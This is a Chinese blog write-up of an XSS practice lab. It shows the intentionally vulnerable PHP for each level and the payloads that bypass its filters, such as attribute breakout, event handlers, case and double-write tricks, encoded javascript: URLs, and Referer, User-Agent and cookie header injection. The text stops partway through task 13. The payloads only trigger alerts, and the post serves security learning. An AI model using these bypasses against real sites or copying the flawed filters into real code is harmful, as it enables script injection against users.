        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/14/XSS-travel/" class="post-title-link" itemprop="url">XSS-travel</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-14 13:06:20" itemprop="dateCreated datePublished" datetime="2021-12-14T13:06:20+08:00">2021-12-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-27 11:08:58" itemprop="dateModified" datetime="2021-12-27T11:08:58+08:00">2021-12-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="开启你的XSS之旅"><a href="#开启你的XSS之旅" class="headerlink" title="开启你的XSS之旅"></a>开启你的XSS之旅</h1><p><strong>代码预设</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;script&gt;confirm(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="task1-无过滤注入"><a href="#task1-无过滤注入" class="headerlink" title="task1-无过滤注入"></a>task1-无过滤注入</h2><p>通过get请求直接将代码打印在页面上<br><strong>payload</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>出现弹窗，完成注入</p>
<h2 id="task2-对value进行注入"><a href="#task2-对value进行注入" class="headerlink" title="task2-对value进行注入"></a>task2-对value进行注入</h2><p><strong>过滤源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>value没有过滤<br>通过<code>&quot;&gt;</code>闭合标签<br><strong>payload</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="tssk3-转义尖括号的注入"><a href="#tssk3-转义尖括号的注入" class="headerlink" title="tssk3-转义尖括号的注入"></a>tssk3-转义尖括号的注入</h2><p><strong>过滤源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>同时对value和输出进行了过滤<br>可以更改<code>input</code>中的内容进行注入</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&#x27;xxx&#x27;</span>  <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或者输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert(1)  &#x27;</span><br></pre></td></tr></table></figure>
<h2 id="task4-对尖括号的过滤"><a href="#task4-对尖括号的过滤" class="headerlink" title="task4-对尖括号的过滤"></a>task4-对尖括号的过滤</h2><p>同样对<code>&lt;&gt;</code>进行了转义<br><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>仍然可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onfocus=javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
<p>更换input标签同样适用</p>
<h2 id="task5-过滤onfocus"><a href="#task5-过滤onfocus" class="headerlink" title="task5-过滤onfocus"></a>task5-过滤onfocus</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了onfucos<br>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;点我啊&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p><strong>OR</strong><br>更改input标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&#x27;xxx&#x27;  type=&quot;button&quot; onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>没过滤尖括号<br>使用大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; &gt;&lt;sCRipt&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><strong>OR</strong><br>使用万能方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&#x27;xxx&#x27;  type=&quot;button&quot; onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="task7"><a href="#task7" class="headerlink" title="task7"></a>task7</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =strtolower( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptriptscript&gt;alert(1)&lt;/scscriptriptscript&gt;</span><br></pre></td></tr></table></figure>
<p><strong>OR</strong><br>使用万能方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&#x27;xxx&#x27;  type=&quot;button&quot; onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="task8-url编码隔断绕过"><a href="#task8-url编码隔断绕过" class="headerlink" title="task8-url编码隔断绕过"></a>task8-url编码隔断绕过</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>链接被加载herf中<br>但输入值进行了污染<br>本题是get传参<br>可以通过特殊url编码隔断字符<br>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas%0dcript:alert</span><br></pre></td></tr></table></figure>
<h2 id="task9"><a href="#task9" class="headerlink" title="task9"></a>task9</h2><p>对传入链接的格式规范做出了要求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,javas%0dcript:alert&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas%0acript:alert(1) &lt;!--  http://  --&gt;</span><br></pre></td></tr></table></figure>
<h2 id="task10"><a href="#task10" class="headerlink" title="task10"></a>task10</h2><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>没有评论框，使用input偷工减料大法<br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&#x27;xxx&#x27;  type=&quot;button&quot; onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="task11"><a href="#task11" class="headerlink" title="task11"></a>task11</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在http头中添加<code>referer</code>头<br><code>payload：Referer:&quot; onmouseover=alert(11) type=&quot;text&quot;</code><br>或者更改<code>input</code>标签</p>
<h2 id="task12"><a href="#task12" class="headerlink" title="task12"></a>task12</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在http头的<code>user-agent</code>中注入<br><code> User-Agent:&quot; onmouseover=alert(12) type=&quot;text&quot;</code><br>或者更改<code>input</code>标签</p>
<h2 id="TASK13"><a href="#TASK13" class="headerlink" title="TASK13"></a>TASK13</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_cook&quot;  